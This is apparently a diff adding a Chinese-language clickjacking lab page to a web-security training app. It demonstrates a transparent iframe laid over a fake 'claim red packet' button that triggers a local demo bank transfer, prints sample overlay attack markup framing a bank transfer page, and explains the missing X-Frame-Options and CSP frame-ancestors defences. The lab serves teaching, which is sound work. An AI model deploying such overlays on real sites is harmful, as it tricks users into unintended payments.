@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>iframe 覆盖攻击 - Clickjacking Lab</title>
+  <link rel="stylesheet" href="../xss/style.css">
+  <style>
+    .attack-container {
+      position: relative;
+      width: 100%;
+      max-width: 500px;
+      margin: 20px auto;
+    }
+    
+    .decoy-layer {
+      position: relative;
+      background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+      padding: 40px;
+      border-radius: 12px;
+      text-align: center;
+      color: white;
+      z-index: 1;
+    }
+    
+    .decoy-layer h2 {
+      margin: 0 0 10px 0;
+      font-size: 24px;
+    }
+    
+    .decoy-layer p {
+      margin: 0 0 20px 0;
+      opacity: 0.9;
+    }
+    
+    .decoy-btn {
+      background: #fff;
+      color: #ee5a24;
+      border: none;
+      padding: 15px 40px;
+      font-size: 18px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    
+    .iframe-layer {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 2;
+    }
+    
+    .iframe-layer iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+    
+    .opacity-control {
+      margin: 20px 0;
+      padding: 15px;
+      background: #f5f5f5;
+      border-radius: 8px;
+    }
+    
+    .opacity-control label {
+      display: block;
+      margin-bottom: 10px;
+      font-weight: bold;
+    }
+    
+    .opacity-control input[type="range"] {
+      width: 100%;
+    }
+    
+    .victim-view, .attacker-view {
+      border: 2px dashed #ccc;
+      padding: 20px;
+      margin: 20px 0;
+      border-radius: 8px;
+    }
+    
+    .victim-view { border-color: #4caf50; }
+    .attacker-view { border-color: #f44336; }
+    
+    .view-label {
+      display: inline-block;
+      padding: 4px 12px;
+      border-radius: 4px;
+      font-size: 12px;
+      margin-bottom: 10px;
+    }
+    
+    .victim-view .view-label { background: #e8f5e9; color: #2e7d32; }
+    .attacker-view .view-label { background: #ffebee; color: #c62828; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <a href="index.html" class="back-link">← 返回 Clickjacking Lab</a>
+    
+    <h1>🎯 实验一：iframe 覆盖攻击</h1>
+
+    <div class="warning-box">
+      <strong>⚠️ 攻击演示</strong>
+      <p>调整透明度滑块，观察攻击者如何隐藏真实的银行页面</p>
+    </div>
+
+    <section>
+      <h2>📖 攻击原理</h2>
+      <div class="info-box">
+        <ol>
+          <li>攻击者创建一个诱人的页面（如"领取红包"）</li>
+          <li>在页面上覆盖一个透明的 iframe，加载目标网站</li>
+          <li>调整 iframe 位置，使目标按钮与诱饵按钮重叠</li>
+          <li>用户以为点击诱饵，实际点击了 iframe 中的真实按钮</li>
+        </ol>
+      </div>
+    </section>
+
+    <section>
+      <h2>🎮 攻击演示</h2>
+      
+      <div class="opacity-control">
+        <label>iframe 透明度: <span id="opacity-value">0%</span> (攻击时设为 0%)</label>
+        <input type="range" id="opacity-slider" min="0" max="100" value="0" oninput="updateOpacity(this.value)">
+      </div>
+
+      <div class="attacker-view">
+        <span class="view-label">👿 攻击者视角</span>
+        <p>用户看到的是下面的"领取红包"页面，但实际点击的是透明 iframe 中的银行转账按钮</p>
+        
+        <div class="attack-container">
+          <!-- 诱饵层 -->
+          <div class="decoy-layer">
+            <h2>🎁 恭喜您获得红包！</h2>
+            <p>点击下方按钮立即领取 ¥1000</p>
+            <button class="decoy-btn">立即领取</button>
+          </div>
+          
+          <!-- iframe 覆盖层 -->
+          <div class="iframe-layer" id="iframe-layer">
+            <iframe src="/api/clickjacking/unsafe/transfer-page" id="target-iframe"></iframe>
+          </div>
+        </div>
+      </div>
+
+      <div class="victim-view">
+        <span class="view-label">😇 受害者视角</span>
+        <p>当 iframe 完全透明时，用户只能看到诱饵页面</p>
+        <ul>
+          <li>用户以为在领取红包</li>
+          <li>实际触发了银行转账</li>
+          <li>¥1000 被转走</li>
+        </ul>
+      </div>
+    </section>
+
+    <section>
+      <h2>📊 账户状态</h2>
+      <div class="info-box">
+        <p>当前余额: <strong id="balance">加载中...</strong></p>
+        <p>被劫持转账次数: <span id="hijack-count">0</span></p>
+        <button onclick="resetAccount()" class="btn" style="margin-top: 10px;">重置账户</button>
+        <button onclick="loadAccount()" class="btn btn-secondary" style="margin-top: 10px; margin-left: 10px;">刷新状态</button>
+      </div>
+    </section>
+
+    <section>
+      <h2>💻 攻击代码</h2>
+      <pre><code>&lt;!-- 攻击者页面 --&gt;
+&lt;div style="position: relative;"&gt;
+  &lt;!-- 诱饵层 --&gt;
+  &lt;div class="decoy"&gt;
+    &lt;h2&gt;🎁 领取红包&lt;/h2&gt;
+    &lt;button&gt;立即领取&lt;/button&gt;
+  &lt;/div&gt;
+  
+  &lt;!-- 透明 iframe 覆盖 --&gt;
+  &lt;iframe 
+    src="https://bank.com/transfer" 
+    style="
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0;  /* 完全透明 */
+    "&gt;
+  &lt;/iframe&gt;
+&lt;/div&gt;</code></pre>
+    </section>
+
+    <section>
+      <h2>🔍 为什么攻击成功？</h2>
+      <div class="info-box">
+        <p>目标页面 <strong>没有设置</strong> 以下防护头：</p>
+        <ul>
+          <li><code>X-Frame-Options: DENY</code></li>
+          <li><code>Content-Security-Policy: frame-ancestors 'none'</code></li>
+        </ul>
+        <p>因此可以被任意页面通过 iframe 嵌入</p>
+      </div>
+    </section>
+  </div>
+
+  <script>
+    function updateOpacity(value) {
+      document.getElementById('opacity-value').textContent = value + '%'
+      document.getElementById('iframe-layer').style.opacity = value / 100
+    }
+
+    async function loadAccount() {
+      const res = await fetch('/api/clickjacking/account')
+      const data = await res.json()
+      document.getElementById('balance').textContent = `¥${data.balance}`
+      const hijackCount = data.actions.filter(a => !a.protected).length
+      document.getElementById('hijack-count').textContent = hijackCount
+    }
+
+    async function resetAccount() {
+      await fetch('/api/clickjacking/reset', { method: 'POST' })
+      loadAccount()
+    }
+
+    loadAccount()
+    setInterval(loadAccount, 2000)
+  </script>
+</body>
+</html>
